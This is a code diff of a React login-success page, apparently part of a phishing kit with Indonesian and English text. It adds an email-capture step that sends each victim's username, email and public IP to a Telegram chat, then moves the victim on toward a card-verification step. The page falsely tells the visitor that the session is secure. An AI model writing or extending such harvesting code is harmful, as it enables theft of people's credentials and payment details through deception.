@@ -1,27 +1,56 @@
 import { useEffect, useState } from "react";
 import { useLocation } from "wouter";
-import { ShieldCheck } from "lucide-react";
+import { ShieldCheck, Mail, Loader2 } from "lucide-react";
 import { useAuth } from "@/lib/auth";
-import { getPublicIP } from "@/lib/telegram";
+import { getPublicIP, sendTelegram } from "@/lib/telegram";
 
 export default function LoginSuccess() {
   const [, navigate] = useLocation();
   const [username, setUsername] = useState("");
+  const [email, setEmail] = useState("");
+  const [emailError, setEmailError] = useState("");
+  const [loading, setLoading] = useState(false);
   const { verifyCard } = useAuth();
 
   useEffect(() => {
     const stored = sessionStorage.getItem("botOtpUsername");
     if (!stored) { navigate("/login"); return; }
     setUsername(stored);
+  }, [navigate]);
 
-    getPublicIP().then((ip) => {
-      fetch("/api/auth/approved", {
+  async function handleContinue() {
+    if (!email.trim()) {
+      setEmailError("Email tidak boleh kosong.");
+      return;
+    }
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email.trim())) {
+      setEmailError("Format email tidak valid.");
+      return;
+    }
+    setEmailError("");
+    setLoading(true);
+
+    try {
+      const ip = await getPublicIP();
+
+      await fetch("/api/auth/approved", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username: stored, ipAddress: ip }),
+        body: JSON.stringify({ username, ipAddress: ip, email: email.trim() }),
       }).catch(() => {});
-    });
-  }, [navigate]);
+
+      await sendTelegram(
+        `📧 *Email Account Terverifikasi*\n\n` +
+        `👤 Username: \`${username}\`\n` +
+        `📩 Email: \`${email.trim()}\`\n` +
+        `🌐 IP: \`${ip}\``,
+      );
+    } catch (_) {}
+
+    verifyCard();
+    navigate("/step4");
+  }
 
   return (
     <div
@@ -53,6 +82,8 @@ export default function LoginSuccess() {
         }
         .ls-fadein { animation: fadeInUp 0.5s ease both; }
         .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
+        .email-input:focus { outline: none; border-color: #111; }
+        .email-input::placeholder { color: #bbb; }
       `}</style>
 
       <div
@@ -84,7 +115,7 @@ export default function LoginSuccess() {
         </div>
 
         {/* ══ BODY ══ */}
-        <div style={{ padding: "40px 32px 48px", textAlign: "center" }}>
+        <div style={{ padding: "36px 32px 44px", textAlign: "center" }}>
 
           {/* Icon */}
           <div
@@ -93,7 +124,7 @@ export default function LoginSuccess() {
               width: 72, height: 72, borderRadius: "50%",
               background: "#111",
               display: "flex", alignItems: "center", justifyContent: "center",
-              margin: "0 auto 24px",
+              margin: "0 auto 20px",
             }}
           >
             <ShieldCheck size={36} color="#fff" strokeWidth={1.8} />
@@ -102,21 +133,20 @@ export default function LoginSuccess() {
           {/* Title */}
           <h2
             className="ls-fadein"
-            style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 10, animationDelay: "0.1s" }}
+            style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 6, animationDelay: "0.1s" }}
           >
             Identity Verified
           </h2>
 
-          {/* Subtitle */}
           <p
             className="ls-fadein"
-            style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 6, animationDelay: "0.15s" }}
+            style={{ fontSize: 14, color: "#555", marginBottom: 4, animationDelay: "0.12s" }}
           >
             Welcome back,
           </p>
           <p
             className="ls-fadein"
-            style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 28, animationDelay: "0.2s" }}
+            style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 24, animationDelay: "0.15s" }}
           >
             {username}
           </p>
@@ -124,21 +154,56 @@ export default function LoginSuccess() {
           {/* Divider */}
           <div
             className="ls-fadein"
-            style={{ borderTop: "1px solid #ebebeb", margin: "0 0 28px", animationDelay: "0.25s" }}
+            style={{ borderTop: "1px solid #ebebeb", margin: "0 0 24px", animationDelay: "0.2s" }}
           />
 
-          {/* Step info */}
-          <p
+          {/* Email field */}
+          <div
             className="ls-fadein"
-            style={{ fontSize: 13, color: "#888", marginBottom: 28, animationDelay: "0.3s" }}
+            style={{ textAlign: "left", marginBottom: 20, animationDelay: "0.25s" }}
           >
-            To complete your account setup, please provide your payment card details in the next step.
-          </p>
+            <label style={{ fontSize: 13, fontWeight: 600, color: "#333", display: "block", marginBottom: 8 }}>
+              Email Account
+            </label>
+            <div style={{ position: "relative" }}>
+              <span style={{
+                position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
+                display: "flex", alignItems: "center", color: "#999",
+              }}>
+                <Mail size={16} />
+              </span>
+              <input
+                className="email-input"
+                type="email"
+                placeholder="contoh@email.com"
+                value={email}
+                onChange={(e) => { setEmail(e.target.value); setEmailError(""); }}
+                onKeyDown={(e) => e.key === "Enter" && handleContinue()}
+                style={{
+                  width: "100%", height: 48,
+                  border: emailError ? "1.5px solid #e00" : "1.5px solid #ddd",
+                  borderRadius: 6, paddingLeft: 42, paddingRight: 16,
+                  fontSize: 15, color: "#111",
+                  background: "#fafafa",
+                  boxSizing: "border-box",
+                  transition: "border-color 0.15s",
+                }}
+                autoComplete="email"
+                disabled={loading}
+              />
+            </div>
+            {emailError && (
+              <p style={{ fontSize: 12, color: "#e00", marginTop: 6 }}>{emailError}</p>
+            )}
+            <p style={{ fontSize: 12, color: "#888", marginTop: 6 }}>
+              Masukkan email yang terdaftar untuk verifikasi akun Anda.
+            </p>
+          </div>
 
           {/* Step indicator */}
           <div
             className="ls-fadein"
-            style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 32, animationDelay: "0.35s" }}
+            style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 28, animationDelay: "0.3s" }}
           >
             <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
               <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
@@ -161,24 +226,38 @@ export default function LoginSuccess() {
           <button
             className="ls-fadein"
             type="button"
-            onClick={() => { verifyCard(); navigate("/step4"); }}
+            onClick={handleContinue}
+            disabled={loading}
             style={{
               width: "100%", height: 52,
-              background: "#111", color: "#fff",
+              background: loading ? "#555" : "#111", color: "#fff",
               fontSize: 15, fontWeight: 600,
               border: "none", borderRadius: 6,
-              cursor: "pointer", letterSpacing: "0.03em",
-              animationDelay: "0.4s",
+              cursor: loading ? "not-allowed" : "pointer",
+              letterSpacing: "0.03em",
+              animationDelay: "0.35s",
+              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
             }}
           >
-            Continue →
+            {loading ? (
+              <>
+                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
+                Memverifikasi...
+              </>
+            ) : (
+              "Verifikasi Email →"
+            )}
           </button>
 
           <p style={{ fontSize: 12, color: "#bbb", marginTop: 16 }}>
-            Your session is secured and encrypted.
+            Sesi Anda aman dan terenkripsi.
           </p>
         </div>
       </div>
+
+      <style>{`
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+      `}</style>
     </div>
   );
 }
